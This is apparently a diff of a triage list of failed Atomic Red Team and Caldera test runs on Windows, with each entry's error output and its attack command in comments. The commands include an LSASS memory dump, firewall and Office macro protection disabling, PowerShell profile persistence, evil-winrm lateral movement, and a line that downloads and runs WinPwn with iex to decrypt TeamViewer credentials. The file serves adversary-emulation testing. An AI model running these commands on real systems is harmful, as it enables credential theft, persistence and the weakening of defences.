+	"atomic_windows_depfalse_pshtrue__t1546_013__multiple__event_triggered_execution-_powershell_profile__49a7502f9c667aa3af9c87f6ab1e68b3",  # ['Add-Content : Could not find a part of the path \'C:\\Users\\puma-4\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\'.At line:1 char:1+ Add-Content $profile -Value ""; Add-Content $profile -Value "Start-Pr ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ell_profile.ps1:String) [Add-Content], DirectoryNotFo    undException    + FullyQualifiedErrorId : GetContentWriterDirectoryNotFoundError,Microsoft.PowerShell.Commands.AddContentCommand Add-Content : Could not find a part of the path \'C:\\Users\\puma-4\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\'.At line:1 char:33+ ...  -Value ""; Add-Content $profile -Value "Start-Process calc.exe"; pow ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ell_profile.ps1:String) [Add-Content], DirectoryNotFo    undException    + FullyQualifiedErrorId : GetContentWriterDirectoryNotFoundError,Microsoft.PowerShell.Commands.AddContentCommand ']
+																																			  # ['Add-Content $profile -Value ""; Add-Content $profile -Value "Start-Process calc.exe"; powershell -Command exit']
+
+	"atomic_windows_depfalse_pshtrue__t1486__impact__data_encrypted_for_impact__f22a27383f804337af8e690aae594d97", # ["gpg: keybox 'C:\\\\Users\\\\puma-4\\\\AppData\\\\Roaming\\\\gnupg\\\\pubring.kbx' createdgpg: can't open '$env:temp\\\\test.txt': No such file or directorygpg: symmetric encryption of '$env:temp\\\\test.txt' failed: No such file or directory"]
+																												   # ['if (test-path \'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe\') { ; } else {New-Item -Type Directory "PathToAtomicsFolder\\..\\ExternalPayloads\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest "https://files.gpg4win.org/gpg4win-4.1.0.exe" -outfile "PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe"; cmd /c "PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe" /S};  ;  cmd /c \'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe\' -c \'$env:temp\\test.txt\'']
+
+	"atomic_windows_depfalse_pshtrue__t1133__multiple__external_remote_services__ff4e1ea516f781a6ef93323ba9dfac0a", # also chrome related
+																													# ['Start : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:406+ ... ice/update2/crx" -PropertyType "String" -Force}; Start chrome; Start- ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Stop-Process : Cannot find a process with the name "chrome". Verify the process name and call the cmdlet again.At line:1 char:445+ ... }; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name "chrome"+                                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (chrome:String) [Stop-Process], ProcessCommandException    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand ']
+																													# ['$extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path "HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name "chrome"']
+
+	"atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__04858322bc6cd08282f2ce96cab5ee7c", # might be easy fix
+																																			   # ["Remove-Item : Cannot find path 'C:\\Users\\puma-4\\AppData\\Local\\Temp\\deleteme_T1551.004' because it does not exist.At line:1 char:1+ Remove-Item -path $env:TEMP\\deleteme_T1551.004+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...eteme_T1551.004:String) [Remove-Item], ItemNotFoundEx    ception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand "]
+																																			   # ['Remove-Item -path $env:TEMP\\deleteme_T1551.004']
+
+	"atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__36aa805044ab4f4d7f6f372a46c8bab2", # might be easy fix
+																																			   # ["Remove-Item : Cannot find path 'C:\\Users\\puma-4\\AppData\\Local\\Temp\\deleteme_folder_T1551.004' because it does not exist.At line:1 char:1+ Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...older_T1551.004:String) [Remove-Item], ItemNotFoundEx    ception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand "]
+																																			   # ['Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse']
+
+	"atomic_windows_depfalse_pshtrue__t1055_011__multiple__process_injection-_extra_window_memory_injection__a8a3487e477e0c1501ceb0239b5cad15", # ["4a3cbc_T1055.011_x64.exe : The term '4a3cbc_T1055.011_x64.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ 4a3cbc_T1055.011_x64.exe+ ~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (4a3cbc_T1055.011_x64.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException "]
+																																				# ['4a3cbc_T1055.011_x64.exe']
+
+	"atomic_windows_depfalse_pshtrue__t1039__collection__data_from_network_shared_drive__73fed1f32224461748c3630217b7d300", # ['copy-item : Cannot find path \'\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\' because it does not exist.At line:1 char:1+ copy-item -Path "\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password" - ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\\\127.0.0.1\\C$\\..._Bunny.password:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+																															# ['copy-item -Path "\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password" -Destination "$Env:TEMP\\Easter_egg.password"']
+
+	"atomic_windows_depfalse_pshtrue__t1027_004__defense-evasion__obfuscated_files_or_information-_compile_after_delivery__55b2c04e70a5711957e264b04e645e91", # ["893687_T1027.004_DynamicCompile.exe : The term '893687_T1027.004_DynamicCompile.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ 893687_T1027.004_DynamicCompile.exe+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (893687_T1027.004_DynamicCompile.exe:String) [], CommandNotFoundExceptio    n    + FullyQualifiedErrorId : CommandNotFoundException "]
+																																							  # ['Invoke-Expression "893687_T1027.004_DynamicCompile.exe"']
+
+	"atomic_windows_depfalse_pshtrue__t1021_006__lateral-movement__remote_services-_windows_remote_management__dce08779676c01d98885e164a1176ac8", # ["evil-winrm : The term 'evil-winrm' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1+ ~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (evil-winrm:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException "]
+ 																																				  # ['evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1']
+
+	"atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1", # ['resolve-path : Cannot find path \'C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\' because it does not exist.At line:1 char:13+ $exePath =  resolve-path "$env:ProgramFiles\\dotnet\\shared\\Microsoft.N ...+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Program File...oft.NETCore.App:String) [Resolve-Path], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.ResolvePathCommand The expression after \'&\' in a pipeline element produced an object that was not valid. It must result in a command name, a script block, or a CommandInfo object.At line:1 char:103+ ... shared\\Microsoft.NETCore.App\\5*\\createdump.exe"; & "$exePath" -u -f $ ...+                                                        ~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:String) [], RuntimeException    + FullyQualifiedErrorId : BadExpression ']
+																																			# ['$exePath =  resolve-path "$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe"; & "$exePath" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id']
 ],
 
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+# TODO -- 세분화 + 'STDERR or STDOUT' AND 'COMMAND' COPY-PASTE
+"Cannot find path <REGISTRY>" : [
+	"stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e", # Maybe could fix
+																																				      # ["Set-ItemProperty : Cannot find path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell' because it does not exist.At line:1 char:1+ Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Powe ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...dows\\PowerShell:String) [Set-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand You cannot call a method on a null-valued expression.At line:1 char:121+ ... ass;        $shell = New-Object -ComObject Wscript.Shell        Set-E ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull "]
+																																					  # ['Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;        $shell = New-Object -ComObject Wscript.Shell        Set-ExecutionPolicy Bypass | echo $shell.sendkeys("Y`r`n")']
 
+	"atomic_windows_depfalse_pshtrue__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__986876c6024765475043100f9e080fc8", # Maybe could fix
+																																					     # ['New-ItemProperty : Cannot find path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\' because it does not exist.At line:1 char:1+ New-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\D ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\SOFTWARE\\...l\\DomainProfile:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\' because it does not exist.At line:1 char:142+ ... e 0 -Force; New-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\SOFTWARE\\...StandardProfile:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']
+																																					     # ['New-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force; New-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force']
 
-"Retrieving the COM class factory for component with CLSID": [
-	"atomic_windows_depfalse_pshtrue__t1566_001__initial-access__phishing-_spearphishing_attachment__0a69420bec84b02bd47464f6835653b1",
-	"atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__935e8026584b85192519c57d7080b048",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__cde814c61dcd8b0fbeeb14f005c2432f",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__ab1b50880382b06d48d3d23ad1786239",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__623806a6fd4d832b6692eb275535f636",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__431121fe12b6fd82938a9a52526b3423",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__705c4b9714ce06223e7d7038cd332808",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__98adc43648b0e4ea6e90a88ad5ae4b3d",
-	"atomic_windows_depfalse_pshtrue__t1115__collection__clipboard_data__abd5327a47c4994e2824f833eefe4250",
-	"atomic_windows_depfalse_pshtrue__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__05f8b752dbccff102ef530103bd8e550",
-	"atomic_windows_depfalse_pshtrue__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__42302f7d89c15f8070f83e743771d567",
-	"atomic_windows_depfalse_pshtrue__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__9c955a373154a7090d4b4396b561f5da",
-	"atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__9999b5c073203122cbe5f1f5438cf637",
-	"atomic_windows_depfalse_pshtrue__t1055_012__multiple__process_injection-_process_hollowing__557321faaf98c77b2b452cecd7b1de37",
-	"atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__920a251237fac2b70fe4d647aa16bfdd",
+	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__cb6e6c7e18aba2207c696368f8edb23a", # Maybe could fix
+																																			   # ['New-ItemProperty : Cannot find path \'HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\' because it does not exist.At line:1 char:1+ New-ItemProperty "HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE" -Na ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...ft\\Windows\\OOBE:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']
+																																			   # ['New-ItemProperty "HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force']
+
+	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b66a6eed7d46ab2ca4c3bf1ae3b61f44", # Maybe could fix
+																																			   # ['New-Item : The registry key at the specified path does not exist.At line:1 char:1+ New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"; New-Item ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...oft\\Office\\16.0:String) [New-Item], ArgumentExceptio    n    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand New-Item : The registry key at the specified path does not exist.At line:1 char:62+ ... 6.0\\Excel"; New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Exce ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...fice\\16.0\\Excel:String) [New-Item], ArgumentExceptio    n    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand New-Item : The registry key at the specified path does not exist.At line:1 char:132+ ... \\Security"; New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Exce ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...\\Excel\\Security:String) [New-Item], ArgumentExceptio    n    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand New-ItemProperty : Cannot find path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\' because it does not exist.At line:1 char:216+ ... ectedView"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\1 ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...\\Excel\\Security:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\' because it does not exist.At line:1 char:347+ ... pe "Dword"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\1 ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...y\\ProtectedView:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\' because it does not exist.At line:1 char:505+ ... pe "Dword"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\1 ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...y\\ProtectedView:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\' because it does not exist.At line:1 char:665+ ... pe "Dword"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\1 ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...y\\ProtectedView:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']
+																																			   # ['New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"; New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"; New-Item -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"']
+
+	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__4df316c222125fe7372723c5b3434977", # Maybe could fix
+																																			   # ['New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:1+ New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Curren ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:147+ ... e 1 -Force; New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:286+ ... tor -Force; New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:425+ ... com -Force; New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']
+																																			   # ['New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name DefaultPassword  -Value password1 -Force']
+
+	"atomic_windows_depfalse_pshtrue__t1547_014__multiple__active_setup__7ad5840a79f3259965fa28835dda93c4", # ['Set-ItemProperty : Cannot find path \'HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\' because it does not exist.At line:1 char:1+ Set-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Install ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\SOFTWARE\\...E-444553540600}:String) [Set-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand ']
+																											# ['Set-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Value "0,0,0,0"; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup']
+
+	"atomic_windows_depfalse_pshtrue__t1546_011__multiple__event_triggered_execution-_application_shimming__ed65658e4431bc3b636dd0de29bf8e35",  # ['New-ItemProperty : Cannot find path \'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\' because it does not exist.At line:1 char:163+ ... T1546.011"; New-ItemProperty -Path HKLM:"\\SOFTWARE\\Microsoft\\Windows  ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\SOFTWARE\\...gs\\InstalledSDB:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']
+																																				# ['New-ItemProperty -Path HKLM:"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"; New-ItemProperty -Path HKLM:"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"']
+
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__a45769d74eb1c75ff916b121023bde31", # Excel related
+																															   # ['New-ItemProperty : Cannot find path \'HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\' because it does not exist.At line:1 char:60+ ... \\Programs"; New-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWA ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKEY_CURRENT_US...\\Excel\\Security:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand & : The term \'.\\Excel 2016.lnk\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:229+ ... " -PropertyType DWORD -Force | Out-Null; & \'.\\Excel 2016.lnk\' "PathTo ...+                                                ~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\Excel 2016.lnk:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+																															   # ['Cd "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"; New-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null; & \'.\\Excel 2016.lnk\' "PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm"']
+
+	"atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__86993ae14d75a6da421c0d98c3facd61",	# ['New-ItemProperty : Cannot find path \'HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\' because it does not exist.At line:1 char:1+ New-ItemProperty -Path "HKCU:\\Software\\Policies\\Microsoft\\Windows\\Sys ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...\\Windows\\System:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']
+																													# ['New-ItemProperty -Path "HKCU:\\Software\\Policies\\Microsoft\\Windows\\System" -Name DisableCMD -Value 1']
+
+],																						
+
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+"Program not installed issue":[
+	"atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__f6867f2b9b1b3c2eb733ad7ce7438f04", # team-viewer
+																																	 # ['Looking for Registry entries on this system:No Teamviewer installed, sorry']
+																																	 # ["$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); decryptteamviewer -consoleoutput -noninteractive"]
+	
